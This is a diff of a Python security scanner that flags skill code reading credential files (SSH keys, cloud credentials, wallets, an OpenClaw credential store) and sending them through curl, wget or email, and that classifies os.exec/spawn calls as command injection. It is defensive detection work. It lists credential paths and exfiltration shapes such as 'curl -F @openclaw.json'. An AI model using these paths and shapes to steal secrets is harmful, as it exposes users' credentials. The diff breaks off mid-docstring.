@@ -22,6 +22,7 @@ from __future__ import annotations
 import ast
 import bisect
 import builtins
+import posixpath
 import re
 import weakref
 from collections import namedtuple
@@ -1089,6 +1090,31 @@ _CURL_WGET_PROGRAMS = {"curl", "wget"}
 _CURL_OUTPUT_FLAGS = {"-o", "--output"}
 _SCRIPT_LIKE_EXTS = (".sh", ".bash", ".py", ".ps1", ".rb", ".pl")
 
+# B-1059: a credential's value is the CONTENT of ~/.ssh/id_rsa etc. -- there is no benign
+# curl/wget position for it (not a header, not the body, not even the `-o` output name),
+# so the egress-sink test is simply "a credential-tainted name reaches a curl/wget argv
+# call at all" (in its argv list OR an `input=`/`stdin=`/`env=` kwarg -- `hit_names` is
+# computed over the whole Call, so a stdin-piped `curl --data @-` is covered without a
+# position list to keep complete). This path takes NO in-cluster carve-out, deliberately:
+# a carve-out that CLEARS a credential-exfil finding must be airtight (CLAUDE.md 2.5),
+# and proving a curl argv "reaches only the cluster API" is a full argv parse (routing
+# flags --proxy/--resolve/--connect-to/-K, clustered/glued options, schemeless
+# positional hosts) that a hand-rolled denylist cannot do soundly -- so sending even an
+# in-cluster service-account token through curl fails CLOSED here (that IS exfil when the
+# real destination is an attacker host). The measured B-415 in-cluster leniency still
+# applies to the Python net-sink path via `_is_incluster_auth_exempt`; no benign
+# curl-in-cluster shape has been observed on the real fleet, so none is carved out
+# speculatively -- the fleet FP gate surfaces one if it exists.
+#
+# SCOPE (inherited, not new): this reuses `_is_curl_wget_argv_call`, the SAME matcher
+# DROPPER_DOWNLOAD_TO_TMP (C-205) uses, so it inherits that matcher's resolution limits --
+# a literal `subprocess.<attr>(["curl"|"wget", ...])` only; a `curl.exe` basename, a
+# program/argv reached through a variable, a bare `run` from `from subprocess import run`,
+# or an `args=`-keyword argv are not recognised. Widening the matcher changes DROPPER too
+# and needs its own cross-consumer adversarial pass, so it is deliberately NOT done here;
+# the broad alternative ("any subprocess carrying a credential is egress") is unsound -- it
+# convicts local credential tools (gpg --encrypt, logger) that never leave the host.
+
 
 def _is_curl_wget_argv_call(node: ast.AST) -> bool:
     """subprocess.run/call/check_call/check_output/Popen(['curl', ...] | ['wget', ...])
@@ -1321,6 +1347,18 @@ _CRED_PATH_RE = re.compile(
     r"\.aws/credentials|login\.keychain|wallet\.dat|"
     r"keystore\.json|\.npmrc|\.pypirc|\.netrc|\.docker/config|\.kube/config|"
     r"\.config/gcloud|/\.?secrets?\b|cookies\.sqlite|Cookies\b|"
+    # B-1060: the OpenClaw config/credential store itself. `openclaw.json` holds the
+    # user's API keys and auth profiles and `credentials` is the flat credential file --
+    # the crown jewels on an OpenClaw box. The SHELL cred-path set already treats
+    # `.openclaw/` as a credential source (so `curl -F @openclaw.json` FAILs), but the
+    # Python critical path omitted it, so a read of openclaw.json -> network sink vetted
+    # INSTALL with no finding while the same shape reading ~/.ssh/id_rsa FAILed. Scoped
+    # to the two credential-bearing files, NOT all of `.openclaw/`: general agent-config
+    # reads stay on the info-level ENV_EXFIL_FLOW (_AGENT_CONFIG_PATH_RE), whose "skills
+    # legitimately send an API key to their own API" rationale does not hold for
+    # uploading the whole credential store -- the same reason .aws/credentials is
+    # critical regardless of destination.
+    r"\.openclaw/(?:openclaw\.json|credentials)|"
     # E-065/C-323: the HF-incident reproduction read a process's own environment
     # (which commonly carries API keys/tokens passed via env var) through procfs
     # rather than a dotfile. /var/run/secrets and /run/secrets (K8s service-account
@@ -1425,7 +1463,15 @@ _INCLUSTER_DEST_WORD_HTTPS_RE = re.compile(
 # were already gated. "post"/"urlopen" stay ungated: no comparably common
 # non-network false-positive shape for those two turned up during the same review.
 _NET_SINK_ATTRS_ANY = {"post", "urlopen"}
-_NET_SINK_ATTRS_BASED = {"send", "sendall", "sendto", "connect", "put", "patch", "request"}
+# B-1058: `sendmail`/`send_message` are smtplib's data-bearing send methods -- email is a
+# network egress channel for a credential just as much as an HTTP POST. Base-gated like
+# the socket send family below, so they only count when the receiver resolves to a known
+# networking base/alias (a `smtplib.SMTP(...)` object registered by _net_sink_alias_names);
+# an unrelated object's own `.send_message(...)` never fires.
+_NET_SINK_ATTRS_BASED = {
+    "send", "sendall", "sendto", "connect", "put", "patch", "request",
+    "sendmail", "send_message",
+}
 _NET_SINK_BASES = {
     "requests",
     "httpx",
@@ -3390,6 +3436,482 @@ def _call_args_tainted_for_exec_sink(
     return False, False
 
 
+def _b1022_mutated_argv_taint(
+    node: ast.Call,
+    scope: ast.AST,
+    tainted: set,
+    ref_res: "_RefResolver | None",
+    tree: ast.AST,
+) -> bool:
+    """B-1022: is the subprocess sink's argv a bare local Name (`subprocess.run(a)`, or
+    `run(list(a))`) that a LITERAL list was bound to and that `.append()`/`.extend()`
+    later fed an externally-tainted element, in the same scope?
+
+    Taint propagation never marks the receiver of `.append(tainted)` tainted (an
+    `a += [q]` is an AugAssign and does propagate), so `a=['sh']; a.extend(['-c', q]);
+    subprocess.run(a)` had no tainted Name in the sink call at all and TT5 stayed
+    silent -- while the same list handed through a one-parameter wrapper was crit.
+    Returning True here only makes the caller treat the call as tainted; the verdict
+    (crit vs TT5_ARG_INJECTION) is still `_subprocess_taint_is_command_injection`'s: a
+    shell / re-exec-wrapper head is dropped from the single-literal bindings by B-953,
+    so the Name stays unresolved and is crit, while `['git', 'log']` keeps its binding
+    and reads as argument injection.
+
+    Deliberately narrow: only a Name that has at least one list/tuple literal
+    assignment in `scope` (a name built from a call -- `shlex.split(...)` -- or only
+    ever assigned elsewhere is not claimed), mutation calls in the SAME scope, any
+    textual position relative to the sink (conservative), and the mutation's argument
+    is judged by the same inline/named source vocabulary as the sink's own arguments."""
+    first = node.args[0] if node.args else None
+    if first is None:
+        # `subprocess.run(args=a)`: the keyword spelling of the same slot. The classifier
+        # does not read a keyword argv, so a tainted keyword call is already crit there.
+        first = next((k.value for k in node.keywords if k.arg == "args"), None)
+    if (
+        isinstance(first, ast.Call)
+        and isinstance(first.func, ast.Name)
+        and first.func.id in ("list", "tuple")
+        and len(first.args) == 1
+        and not first.keywords
+        and isinstance(first.args[0], ast.Name)
+        and not _name_rebound_anywhere(tree, first.func.id)
+    ):
+        first = first.args[0]
+    if not isinstance(first, ast.Name):
+        return False
+    name = first.id
+    nodes = list(_scope_own_nodes(scope))
+    if not any(
+        isinstance(n, ast.Assign)
+        and isinstance(n.value, (ast.List, ast.Tuple))
+        and any(isinstance(t, ast.Name) and t.id == name for t in n.targets)
+        for n in nodes
+    ):
+        return False
+    for n in nodes:
+        if (
+            isinstance(n, ast.Call)
+            and isinstance(n.func, ast.Attribute)
+            and n.func.attr in _TRAILING_ONLY_MUTATORS
+            and isinstance(n.func.value, ast.Name)
+            and n.func.value.id == name
+            and _call_args_tainted_for_exec_sink(n, tainted, ref_res=ref_res, tree=tree)[0]
+        ):
+            return True
+    return False
+
+
+# B-1024: `os.exec*` / `os.spawn*` run a program given as a SEPARATE argument. `v` forms
+# take the argv as one list, `l` forms as trailing positional arguments (an `e` form's
+# last positional is the environment mapping, not argv). `spawn*` has the mode first.
+# Listed exactly (not by prefix) so an unrelated `os.exec_foo` is never claimed;
+# `os.system`/`os.popen` are already TT5 sinks via `_is_exec_sink_call` and
+# `posix_spawn*` is not part of this rule.
+_OS_EXEC_VECTOR = frozenset({"execv", "execve", "execvp", "execvpe"})
+_OS_EXEC_LIST = frozenset({"execl", "execle", "execlp", "execlpe"})
+_OS_SPAWN_VECTOR = frozenset({"spawnv", "spawnve", "spawnvp", "spawnvpe"})
+_OS_SPAWN_LIST = frozenset({"spawnl", "spawnle", "spawnlp", "spawnlpe"})
+# B-1042: `os.posix_spawn(path, argv, env, *, ...)` / `posix_spawnp`: program, argv list and
+# the environment, positionally, then keyword-only knobs that never change what runs.
+_OS_POSIX_SPAWN = frozenset({"posix_spawn", "posix_spawnp"})
+_POSIX_SPAWN_KNOBS = frozenset({
+    "file_actions", "setpgroup", "resetids", "setsid", "setsigmask", "setsigdef", "scheduler",
+})
+
+
+def _os_exec_spawn_parts(node: ast.Call) -> "tuple | None":
+    """B-1024: `(sink_name, program_expr, argv, all_exprs)` for an `os.exec*`/`os.spawn*`
+    call, or None when it is not one. `argv` is a list of element expressions for an `l`
+    form, or the single argv expression for a `v` form; `all_exprs` is every argument and
+    keyword value of the call.
+
+    `program_expr` is None -- the OPAQUE shape -- whenever the call cannot be mapped onto
+    its program/argv slots soundly: a starred positional (`*rest`, a `**kw`), a keyword
+    this table does not know, a slot given twice, an `l` form with any keyword, or a
+    missing program/argv. The verdict then fails closed on `all_exprs` alone. Keywords of
+    a `v` form map by name (`file`/`path` -> program, `args`/`argv` -> argv; `mode` and
+    `env` are ignored), so `os.execvp(file='git', args=['git', q])` still reads as a
+    readable list."""
+    f = node.func
+    if not (isinstance(f, ast.Attribute) and _attr_base(f.value) in _EXEC_SINK_BASES_OS):
+        return None
+    attr = f.attr
+    posix = attr in _OS_POSIX_SPAWN
+    if attr in _OS_EXEC_VECTOR or posix:
+        lead, vector = 0, True
+    elif attr in _OS_SPAWN_VECTOR:
+        lead, vector = 1, True
+    elif attr in _OS_EXEC_LIST:
+        lead, vector = 0, False
+    elif attr in _OS_SPAWN_LIST:
+        lead, vector = 1, False
+    else:
+        return None
+    name = f"os.{attr}"
+    all_exprs = list(node.args) + [k.value for k in node.keywords]
+    opaque = (name, None, None, all_exprs)
+    if any(k.arg is None for k in node.keywords):
+        return opaque
+    if any(isinstance(a, ast.Starred) for a in node.args):
+        # B-1040: a starred argument AFTER argv[0] of a plain `l` form (`execl(p, a0, 'x',
+        # *rest)`) is just an unreadable tail of argv -- the verdict reads it as a partial
+        # literal. Anywhere else (the program, the mode, argv[0], any `v` form, an `e`
+        # form whose last positional is the environment) the slots cannot be mapped.
+        if not (
+            not vector
+            and not attr.endswith(("le", "lpe"))
+            and not node.keywords
+            and len(node.args) >= lead + 2
+            and not any(isinstance(a, ast.Starred) for a in node.args[: lead + 2])
+        ):
+            return opaque
+    args = list(node.args)
+    if not vector:
+        # `l` forms: file (and the spawn mode) positionally, then argv[0], argv[1:]...
+        if node.keywords or len(args) < lead + 2:
+            return opaque
+        rest = args[lead + 1:]
+        if attr.endswith(("le", "lpe")):
+            rest = rest[:-1]  # trailing environment mapping (no Starred here, checked above)
+        return name, args[lead], rest, all_exprs
+    slots = (["mode"] if lead else []) + ["prog", "argv"] + (
+        ["env"] if posix or "e" in attr[lead + 4:] else []
+    )
+    if len(args) > len(slots):
+        return opaque
+    got = dict(zip(slots, args))
+    kw_slot = {"file": "prog", "path": "prog", "args": "argv", "argv": "argv",
+               "mode": "mode", "env": "env"}
+    for k in node.keywords:
+        if posix and k.arg in _POSIX_SPAWN_KNOBS:
+            continue
+        slot = kw_slot.get(k.arg)
+        if slot is None or slot not in slots or slot in got:
+            return opaque
+        got[slot] = k.value
+    if "prog" not in got or "argv" not in got:
+        return opaque
+    return name, got["prog"], got["argv"], all_exprs
+
+
+def _single_str_binding(
+    scope: ast.AST, name: str, before_line: int, accept: "object | None" = None
+) -> "ast.AST | None":
+    """B-1024: the string literal a bare `name` is provably bound to in `scope`, or None.
+
+    Deliberately small: exactly one store of the name in the scope's own body, a plain
+    top-level `name = "literal"` statement (never inside an if/for/try/with, so a path
+    that skips it cannot leave an earlier value behind), located before `before_line`,
+    the name not a parameter of the scope, and no `global`/`nonlocal`/other rebinding
+    anywhere (`_b1018_other_unsafe`). Anything else is unresolved.
+
+    B-1040: `accept`, when given, replaces the "is a string literal" test on the bound
+    value (a callable on the value node), so the same single-binding proof can resolve a
+    name bound once to `sys.executable`."""
+    body = getattr(scope, "body", None)
+    if not body:
+        return None
+    if isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef)):
+        a = scope.args
+        params = [*a.posonlyargs, *a.args, *a.kwonlyargs, a.vararg, a.kwarg]
+        if any(x is not None and x.arg == name for x in params):
+            return None
+    found = [
+        st for st in body
+        if isinstance(st, ast.Assign)
+        and len(st.targets) == 1
+        and isinstance(st.targets[0], ast.Name)
+        and st.targets[0].id == name
+    ]
+    if len(found) != 1:
+        return None
+    st = found[0]
+    if accept is not None:
+        if not accept(st.value):
+            return None
+    elif not (isinstance(st.value, ast.Constant) and isinstance(st.value.value, str)):
+        return None
+    if getattr(st, "lineno", before_line) >= before_line or _b1018_other_unsafe(scope, name, st):
+        return None
+    return st.value
+
+
+# B-1042: the programs whose FIRST non-option argument is not necessarily a script -- real
+# shells, where a variable in that slot may hold `-c`. (Interpreters are resolved for a
+# bound flag but never treated as opaque: `["python3", script_var, arg]` is ordinary.)
+_B1042_SHELLS = frozenset({
+    "sh", "bash", "zsh", "ksh", "dash", "csh", "tcsh", "ash",
+    "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh",
+})
+
+
+def _b1042_resolve_flags(elts: list, scope: ast.AST, line: int) -> "tuple[list, int | None]":
+    """B-1042: `(elts', opaque_index)` for an argv whose literal head is a shell/interpreter.
+
+    `elts'` has every bare Name element that is provably bound once to a string literal
+    (`_single_str_binding`) replaced by that literal, so `flag = "-c"; ["sh", flag, q]`
+    reads as `["sh", "-c", q]` to `_argv0_is_shell_indirect_exec`. `opaque_index` is, for a
+    real shell head only, the index of the FIRST element that is not a readable string
+    literal (a call, an unresolved name, a splice). The shell's option grammar is
+    deliberately not modelled (it has no closed table -- `-o NAME`, `-O shopt`, `--rcfile F`,
+    cmd's `/k`/`/c`/`/q` all take or shift positions), so literals between the head and that
+    element, `-x`-style or `/x`-style or plain, never end the search. The caller convicts it
+    only when ANY later element is tainted."""
+    head = elts[0] if elts else None
+    if not (isinstance(head, ast.Constant) and isinstance(head.value, str)) or len(elts) < 2:
+        return elts, None
+    base = _argv0_basename(head.value)
+    if base not in _SHELL_EVAL_FLAG_INTERPRETERS:
+        return elts, None
+    shell = base in _B1042_SHELLS
+    out = [head]
+    opaque = None
+    for i, e in enumerate(elts[1:], 1):
+        if isinstance(e, ast.Name):
+            lit = _single_str_binding(scope, e.id, line)
+            if lit is not None:
+                e = lit
+        out.append(e)
+        if shell and opaque is None and not (
+            isinstance(e, ast.Constant) and isinstance(e.value, str)
+        ):
+            opaque = i
+    return out, opaque
+
+
+# B-1040: stand-in program name for `sys.executable` when the question is "could a later
+# element of this argv still be read as an interpreter option?" (`_python_option_list_closed`).
+_SYSEXE_AS_PYTHON = ast.Constant(value="python3")
+
+
+_SYS_PRISTINE_CACHE: "weakref.WeakKeyDictionary" = weakref.WeakKeyDictionary()
+
+# Attribute names of the `sys` module object that can rewrite its namespace.
+_SYS_NAMESPACE_ATTRS = frozenset({"__dict__", "__setattr__", "__delattr__", "modules"})
+
+
+def _sys_executable_is_pristine(tree: ast.AST) -> bool:
+    """B-1040 hardening: may `sys.executable` be read as the real current interpreter?
+
+    True only when (1) `sys` is bound solely by a plain module-level `import sys` -- no alias
+    (`import os as sys`), no `from x import sys`, no other store/del/parameter/def/class/
+    handler/global binding of that name anywhere in the module; (2) nothing writes or deletes
+    an attribute named `executable` on ANY object (`sys.executable = ...`, `del
+    sys.executable`, `+=`, annotated, `for`/`with` targets, an alias's write); and (3) `sys`
+    is only ever used as the base of an attribute read -- never passed or aliased bare
+    (`setattr(sys, ...)`, `vars(sys)`, `getattr(sys, ...)`, `s = sys`) -- and no
+    `sys.__dict__` / `sys.__setattr__` / `sys.__delattr__` / `sys.modules` is mentioned. Any
+    doubt -> False, which keeps the crit verdict (the carve-out stays a precision gain only)."""
+    cached = _SYS_PRISTINE_CACHE.get(tree)
+    if cached is not None:
+        return cached
+    result = _sys_executable_is_pristine_uncached(tree)
+    _SYS_PRISTINE_CACHE[tree] = result
+    return result
+
+
+def _sys_executable_is_pristine_uncached(tree: ast.AST) -> bool:
+    body = getattr(tree, "body", None)
+    if not isinstance(body, list):
+        return False
+    plain = [
+        st for st in body
+        if isinstance(st, ast.Import)
+        and any(a.name == "sys" and a.asname is None for a in st.names)
+    ]
+    if len(plain) != 1:
+        return False
+    bindings = 0
+    parents: dict = {}
+    for n in ast.walk(tree):
+        for child in ast.iter_child_nodes(n):
+            parents[child] = n
+        if isinstance(n, ast.Import):
+            bindings += sum(1 for a in n.names if (a.asname or a.name.split(".")[0]) == "sys")
+        elif isinstance(n, ast.ImportFrom):
+            if any((a.asname or a.name) == "sys" for a in n.names):
+                return False
+        elif isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
+            if n.name == "sys":
+                return False
+            if not isinstance(n, ast.ClassDef):
+                a = n.args
+                if any(x is not None and x.arg == "sys"
+                       for x in [*a.posonlyargs, *a.args, *a.kwonlyargs, a.vararg, a.kwarg]):
+                    return False
+        elif isinstance(n, ast.Lambda):
+            a = n.args
+            if any(x is not None and x.arg == "sys"
+                   for x in [*a.posonlyargs, *a.args, *a.kwonlyargs, a.vararg, a.kwarg]):
+                return False
+        elif isinstance(n, (ast.Global, ast.Nonlocal)):
+            if "sys" in n.names:
+                return False
+        elif isinstance(n, ast.ExceptHandler):
+            if n.name == "sys":
+                return False
+        elif n.__class__.__name__ in ("MatchAs", "MatchStar") and getattr(n, "name", None) == "sys":
+            return False
+        elif n.__class__.__name__ == "MatchMapping" and getattr(n, "rest", None) == "sys":
+            return False
+        elif isinstance(n, ast.Name) and n.id == "sys":
+            if isinstance(n.ctx, (ast.Store, ast.Del)):
+                return False
+            par = parents.get(n)  # parents are filled top-down: a Load's parent is known
+            if not (isinstance(par, ast.Attribute) and par.value is n):
+                return False  # `sys` passed / aliased bare
+            if par.attr in _SYS_NAMESPACE_ATTRS:
+                return False
+        elif (
+            isinstance(n, ast.Attribute)
+            and n.attr == "executable"
+            and isinstance(n.ctx, (ast.Store, ast.Del))
+        ):
+            return False
+    return bindings == 1
+
+
+def _is_sys_executable(expr: ast.AST, scope: ast.AST, line: int, tree: ast.AST) -> bool:
+    """B-1040: is `expr` the current interpreter -- `sys.executable` (verified: `sys` is only
+    the plain `import sys` and nothing rewrites it, `_sys_executable_is_pristine`), or a bare
+    Name bound exactly once, by a plain top-level statement before `line`, to it
+    (`_single_str_binding`'s proof)?"""
+    if not _sys_executable_is_pristine(tree):
+        return False
+    if isinstance(expr, ast.Name):
+        found = _single_str_binding(
+            scope, expr.id, line, lambda v: _b863_a0_is_verified_sys_executable(v, tree)
+        )
+        return found is not None
+    return _b863_a0_is_verified_sys_executable(expr, tree)
+
+
+def _os_exec_spawn_verdict(
+    node: ast.Call,
+    parts: tuple,
+    tainted: set,
+    list_bindings: "dict | None",
+    scope: ast.AST,
+    ref_res: "_RefResolver | None",
+    tree: ast.AST,
+) -> "str | None":
+    """B-1024: `"crit"` (command injection), `"info"` (argument injection) or None for an
+    `os.exec*`/`os.spawn*` call, using the same classification subprocess argv lists get.
+
+    crit: anything tainted in an OPAQUE call (see `_os_exec_spawn_parts`); the program
+    argument is tainted; argv[0] is tainted; the program OR argv[0] is a shell /
+    interpreter-with-eval-flag / re-exec wrapper (`_argv0_is_shell_indirect_exec`, judged
+    on `[program] + argv[1:]` AND on argv itself, because `execv("/bin/sh", ["x", "-c",
+    q])` runs the shell whatever argv[0] says) and any later element is tainted; the argv
+    is not a readable list at all (unresolved name, call result, mutated binding) and
+    anything about it is tainted; or the argv is a literal that is only STALE or PARTIAL
+    -- a name a later append/extend fed, or `[...] + rest` -- while the PROGRAM could be a
+    shell/wrapper (`_prog_name_could_become_shell_indirect`, no literal eval flag needed:
+    the flag typically arrives through the very mutation or concatenation). info: only a
+    non-program element of a fully readable list is tainted. None: nothing tainted."""
+    _name, prog, argv, all_exprs = parts
+
+    def _t(e: ast.AST) -> bool:
+        # same vocabulary the subprocess sink uses for its own arguments
+        # (`_call_args_tainted_for_exec_sink`): a tainted name, an inline source call, or
+        # a positively resolved source
+        return (
+            bool(_names_in(e) & tainted)
+            or _value_is_tainted_source(e, tainted, tree)
+            or (ref_res is not None and ref_res.source_in(e))
+        )
+
+    if prog is None:
+        return "crit" if any(_t(e) for e in all_exprs) else None
+    if _t(prog):
+        return "crit"
+    # a bare Name program bound once to a string literal reads as that literal; any other
+    # non-literal program stays opaque (never a shell by assumption, never folded)
+    line = getattr(node, "lineno", 0)
+    prog_py = _is_sys_executable(prog, scope, line, tree)  # B-1040
+    if isinstance(prog, ast.Name):
+        prog = _single_str_binding(scope, prog.id, line) or prog
+    prog_literal = isinstance(prog, ast.Constant) and isinstance(prog.value, str)
+    # B-1040: the program as far as option parsing is concerned -- a literal, or the
+    # current interpreter read as `python3` (its option list may be closed by a script).
+    prog_eff = prog if prog_literal else (_SYSEXE_AS_PYTHON if prog_py else None)
+    stale = False  # argv is a literal that a mutation / concatenation makes incomplete
+    if isinstance(argv, list):
+        elts = argv
+        if any(isinstance(e, ast.Starred) for e in elts):
+            stale = True  # `os.execl(p, a0, *rest)`: the literal is only part of the argv
+    else:
+        expr = argv
+        if isinstance(expr, ast.Name) and list_bindings and expr.id in list_bindings:
+            expr = list_bindings[expr.id]
+        left = expr.left if isinstance(expr, ast.BinOp) else None
+        left_head = left.elts[0] if isinstance(left, (ast.List, ast.Tuple)) and left.elts else None
+        # B-1040: a head that is the current interpreter reads as `python3`, so the
+        # B-1018 closed-option-list test decides it exactly like a literal python head.
+        head_py = left_head is not None and _is_sys_executable(left_head, scope, line, tree)
+        if (
+            prog_eff is not None
+            and isinstance(expr, ast.BinOp)
+            and isinstance(expr.op, ast.Add)
+            and left_head is not None
+            and (
+                (isinstance(left_head, ast.Constant) and isinstance(left_head.value, str))
+                or head_py
+            )
+            and not _prog_name_could_become_shell_indirect(
+                [_SYSEXE_AS_PYTHON, *left.elts[1:]] if head_py else left.elts
+            )
+            and not _prog_name_could_become_shell_indirect([prog_eff, *left.elts[1:], expr.right])
+        ):
+            # `["x", ...] + rest`: only when neither the program nor the left head can
+            # be a shell / wrapper (a non-literal program is never folded either, but
+            # the current interpreter is read as python3 -- B-1040)
+            expr = ast.List(elts=[*left.elts, expr.right], ctx=ast.Load())
+            stale = True
+        if isinstance(expr, (ast.List, ast.Tuple)):
+            elts = list(expr.elts)
+            if any(isinstance(e, ast.Starred) for e in elts):
+                stale = True  # `["x", *rest]`: the literal is only part of the argv
+        else:
+            # Not a readable list: tainted (directly, or fed by a tainted append/extend)
+            # means the argv could be anything, including `-c <payload>`.
+            probe = ast.Call(func=node.func, args=[argv], keywords=[])
+            if _t(argv) or _b1022_mutated_argv_taint(probe, scope, tainted, ref_res, tree):
+                return "crit"
+            return None
+    if not elts:
+        return None
+    if _t(elts[0]):
+        return "crit"
+    tail_tainted = any(_t(e) for e in elts[1:])
+    if not tail_tainted and isinstance(argv, ast.Name):
+        # a bound literal that a later append/extend (B-1022) or `+=` fed with tainted
+        # data -- the name itself is then tainted; a shell / re-exec head in the literal
+        # never reaches here -- B-953 already dropped its binding -- but the PROGRAM
+        # argument can still be one
+        probe = ast.Call(func=node.func, args=[argv], keywords=[])
+        if _t(argv) or _b1022_mutated_argv_taint(probe, scope, tainted, ref_res, tree):
+            tail_tainted = stale = True
+    if not tail_tainted:
+        return None
+    if _argv0_is_shell_indirect_exec(elts) or _argv0_is_shell_indirect_exec([prog, *elts[1:]]):
+        return "crit"
+    # B-1042: an eval flag held in a single-literal variable, or an unreadable element where
+    # a shell's own option list could still hold one, with a tainted element after it
+    for cand in (elts, [prog, *elts[1:]]):
+        r_elts, opaque = _b1042_resolve_flags(cand, scope, line)
+        if _argv0_is_shell_indirect_exec(r_elts) or (
+            opaque is not None and any(_t(e) for e in r_elts[opaque + 1:])
+        ):
+            return "crit"
+    if stale and (
+        prog_eff is None  # an unresolved program may itself be the shell
+        or _prog_name_could_become_shell_indirect([prog_eff, *elts[1:]])
+    ):
+        return "crit"
+    return "info"
+
+
 def _file_read_prefilter(source: str) -> bool:
     """Cheap text-level pre-check: True when *source* could contain a file-read call
     (`open(`/`read_text`/`read_bytes`). Deliberately a plain SUBSTRING test, not a
@@ -3733,6 +4255,59 @@ _TRAILING_ONLY_MUTATORS = frozenset({"append", "extend"})
 # Deliberately NOT in either set above: `count`/`index` (read-only, never mutate) and
 # `copy` (returns a NEW list; the bound name's own object is untouched).
 
+# B-1042: dunder (and `operator.*`) spellings of in-place mutation. `__setitem__`/
+# `__delitem__` can replace or drop index 0; `__iadd__`/`__imul__` are listed too, mirroring
+# the argv[0]-invalidating set -- the name is simply not trusted after any of them.
+_LIST_DUNDER_MUTATORS = frozenset({
+    "__setitem__", "__delitem__", "__iadd__", "__imul__",
+    "setitem", "delitem", "iadd", "imul",
+})
+
+
+def _call_mutates_list_head(n: ast.Call) -> set:
+    """B-1042: the Name(s) whose list this call may mutate in a way that can change index 0:
+    `name.insert(...)`-style receivers (`_ARGV0_INVALIDATING_MUTATORS` or a dunder /
+    `operator` mutator) and the first argument of `list.insert(name, ...)` /
+    `operator.setitem(name, ...)`-style calls. Empty set when the call is neither."""
+    f = n.func
+    if not (
+        isinstance(f, ast.Attribute)
+        and (f.attr in _ARGV0_INVALIDATING_MUTATORS or f.attr in _LIST_DUNDER_MUTATORS)
+    ):
+        return set()
+    found: set = set()
+    if isinstance(f.value, ast.Name):
+        found.add(f.value.id)
+    if n.args and isinstance(n.args[0], ast.Name):
+        found.add(n.args[0].id)
+    return found
+
+
+_WIN_EXEC_SUFFIXES = (".exe", ".com", ".bat", ".cmd")
+
+
+def _argv0_basename(value: str) -> str:
+    """B-1023: the comparable program name of a literal argv[0] -- directory part (either
+    slash) dropped, lowercased, then Windows name normalisation undone so `sh.exe`,
+    `sh.exe.` (Windows drops trailing dots and spaces), `sh.exe ` , `bash.com` and a
+    stacked `sh.exe.exe` all classify exactly like the bare name. Trailing dots/
+    whitespace and PATHEXT-style suffixes (`.exe`, `.com`, `.bat`, `.cmd`) are stripped
+    repeatedly until neither applies; a name that is nothing but a suffix (`.exe`) is
+    left alone. `cmd.exe`/`powershell.exe` stay in `_SHELL_EVAL_FLAG_INTERPRETERS`
+    verbatim and `cmd`/`powershell` were already there, so their behaviour is unchanged.
+    Fail-closed direction only: over-stripping can only make a name look MORE like a
+    shell / wrapper (crit), never hide one."""
+    name = value.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
+    while True:
+        stripped = name.rstrip(". \t\r\n\x00")
+        for suf in _WIN_EXEC_SUFFIXES:
+            if stripped.endswith(suf) and len(stripped) > len(suf):
+                stripped = stripped[: -len(suf)]
+                break
+        if stripped == name:
+            return name
+        name = stripped
+
 
 def _prog_name_could_become_shell_indirect(elts: list) -> bool:
     """Like `_argv0_is_shell_indirect_exec`'s own argv[0]-identification half, but
@@ -3741,17 +4316,191 @@ def _prog_name_could_become_shell_indirect(elts: list) -> bool:
     what completes the "shell -c <payload>" shape, which a flag-presence check on the
     STALE, pre-mutation literal can never see (the flag and the payload are typically
     added together, in that same call). `_REEXEC_WRAPPER_NAMES` (env/sudo/ssh/...)
-    need no flag at all -- true unconditionally, same as in the stricter check."""
+    need no flag at all -- true unconditionally, same as in the stricter check; `find`
+    is included because the append may itself add the `-exec` action (B-1021)."""
     if not elts:
         return False
     prog = elts[0]
     if not isinstance(prog, ast.Constant) or not isinstance(prog.value, str):
         return False
-    basename = prog.value.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
-    return basename in _SHELL_EVAL_FLAG_INTERPRETERS or basename in _REEXEC_WRAPPER_NAMES
+    basename = _argv0_basename(prog.value)
+    if basename in _PYTHON_INTERPRETERS and _python_option_list_closed(elts):
+        return False  # B-1018: a later append can only reach the module/script's argv
+    return (basename in _SHELL_EVAL_FLAG_INTERPRETERS or basename in _REEXEC_WRAPPER_NAMES
+            or basename == "find")  # B-1021: a later append can add `-exec sh -c <x> ;`
 
 
-def _single_list_bindings_local(scope: ast.AST) -> dict[str, ast.List | ast.Tuple]:
+# B-1018: the Python interpreters in `_SHELL_EVAL_FLAG_INTERPRETERS`.
+_PYTHON_INTERPRETERS = frozenset({"python", "python2", "python3"})
+
+
+def _python_option_list_closed(elts: list) -> bool:
+    """B-1018: has the recorded literal already ENDED the Python interpreter's own option
+    list, so nothing appended later can be read as an interpreter flag (`-c`)?
+
+    CPython stops parsing its own options at `-m <module>` and at the first script
+    path; everything after either goes to the module/script as `sys.argv`, never to the
+    interpreter. Only the exact shapes `[py, "-m", "<module>", ...]` and
+    `[py, "<script>", ...]` count, with every one of those elements a string literal and
+    the module/script not starting with "-" (so not `-`, stdin, nor another option).
+    Anything else -- an option before `-m`, a glued `-mpytest`, a non-literal module --
+    is not closed and keeps B-953's disqualification.
+
+    Whether the MODULE itself then evaluates its arguments (`-m timeit "<code>"`) is the
+    same question as for any ordinary program in argv[0] and is not decided here: an
+    un-appended `[py, "-m", "timeit", tainted]` already reads as argument injection, and
+    this only makes the appended form agree with it."""
+    if len(elts) < 2:
+        return False
+    first = elts[1]
+    if not (isinstance(first, ast.Constant) and isinstance(first.value, str)):
+        return False
+    if first.value == "-m":
+        if len(elts) < 3:
+            return False
+        mod = elts[2]
+        return (
+            isinstance(mod, ast.Constant)
+            and isinstance(mod.value, str)
+            and bool(mod.value)
+            and not mod.value.startswith("-")
+        )
+    return bool(first.value) and not first.value.startswith("-")
+
+
+# B-1042(d), accepted limit: a MODULE-level list mutated INSIDE a function and passed to a
+# sink there (`a = ['git']` at module scope, `def f(): a.append(q); subprocess.run(a)`) is
+# judged per scope -- the function sees no binding for `a` and the module scope sees no
+# mutation. Resolving it needs a whole-program view of every function that can run between
+# the module-level assignment and the sink (the same dynamism that retired the
+# argv0-resolver rounds in `_subprocess_taint_is_command_injection`), so it is left as is
+# and not claimed. Pinned only as "does not raise" in tests/test_b1042_exec_argv_edges.py.
+
+
+def _b1042_appended_head(scope: ast.AST, name: str) -> "tuple[str, ast.List | None]":
+    """B-1042: for `name = []` grown by `.append(x)` / `.extend([...])` / `name += [...]` in
